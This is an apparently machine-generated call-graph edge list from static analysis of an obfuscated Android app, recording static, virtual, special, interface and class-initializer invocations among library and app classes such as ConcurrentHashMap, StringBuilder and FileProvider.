STATIC edge: $r10 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i1, $r1, $r2, null, null) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r13) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("extension subtags are out of order: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>($r1) in <lri: void t(java.lang.Object,int)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must be less than size (%s)", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lvr: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r6.<lvs: int compareTo(java.lang.Enum)>($r7) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int compareTo(java.lang.Enum)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: java.util.Iterator iterator()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ivw: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(17) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] x()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(0) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljd: java.util.Map o()>() in <ljb: java.lang.Object getValue()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <ljd: java.util.Iterator l()> ==> <java.util.LinkedHashMap: java.util.Set entrySet()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Flag [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingSearchTermMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(11) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_Initialized", $r3) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Error: void <init>()> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljd: void A(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.List: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void q(int)>(3) in <ljd: void <init>()> ==> <ljd: void q(int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(16) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lkm: java.lang.Object a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>($l2, $l3) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r2, $r5) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean isEmpty()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lvs: lvs a(java.lang.Object)>($r1) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r5.<lqd: lqd c()>() in <lmb: lme f()> ==> <lqd: lqd c()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: $r3 = interfaceinvoke $r5.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean x(char)>
VIRTUAL edge: $r7 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
INTERFACE edge: $z0 = interfaceinvoke $r8.<java.util.Iterator: boolean hasNext()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.a: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/c;", "value") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int size()>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljf: void i(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqp: void <init>(java.lang.Object[],int,int)> ==> <lkq: void <init>()>
STATIC edge: $r1 = staticinvoke <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>($r3, $r4) in <lme: lma d(java.lang.Object)> ==> <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsc: void <init>(lto)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <lri: int b(java.util.Set)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: int size()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gbk: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lrg: void <init>(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: int hashCode()>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 1) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <mij: void <init>(miy)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>($r2, $l0) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)> ==> <j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(7) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: staticinvoke <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>($r2, $r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>
SPECIAL edge: specialinvoke $r9.<lwk: void <init>()>() in <lwf: void <clinit>()> ==> <lwk: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r4.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <liy: void <init>(ljd)> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lql: int size()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorCategoryMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lma: int e(int)>
STATIC edge: $r3 = staticinvoke <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>($r2, $r6) in <llg: java.lang.Object next()> ==> <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int,int)>(0, $i0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int,int)>
STATIC edge: $z1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r3, $i2, $r6) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r9.<java.lang.StringBuilder: void <init>()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lkh: boolean add(java.lang.Object)>
CLINIT edge: staticinvoke <dwx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dwx: void <clinit>()>
STATIC edge: $z0 = staticinvoke <lri: boolean j(java.util.Set,java.lang.Object)>(r0, $r1) in <lma: boolean equals(java.lang.Object)> ==> <lri: boolean j(java.util.Set,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r5, 0, $r6, 6, $i1) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("at index ") in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <ljf: void <init>()> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljf: int b()> ==> <izw: java.lang.Object al(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: int ae(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $i0 = staticinvoke <izw: int ae(int)>($i0) in <izw: int ak(int)> ==> <izw: int ae(int)>
CLINIT edge: staticinvoke <ql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ql: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<ldr: void <init>()>() in <ldr: void <clinit>()> ==> <ldr: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.lang.Object h(int)>($i0) in <ljb: void <init>(ljd,int)> ==> <ljd: java.lang.Object h(int)>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljd: int z(int,int,int,int)> ==> <izw: int af(int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: staticinvoke <lri: void v(java.lang.Object[],int)>($r0, $i0) in <lri: void u(java.lang.Object[])> ==> <lri: void v(java.lang.Object[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(2) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lql: int size()>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.Throwable getCause()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lkq: int size()>() in <lqs: int size()> ==> <lql: int size()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqp: int size()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("<") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r1 = specialinvoke r0.<lkt: lkx b(boolean)>(1) in <lkt: lkx l()> ==> <lkt: lkx b(boolean)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(axu,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r1.<lnc: void <init>(java.lang.Object)>($r0) in <izw: lsa w(java.lang.Object)> ==> <lnc: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i4, $r0, $i0, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
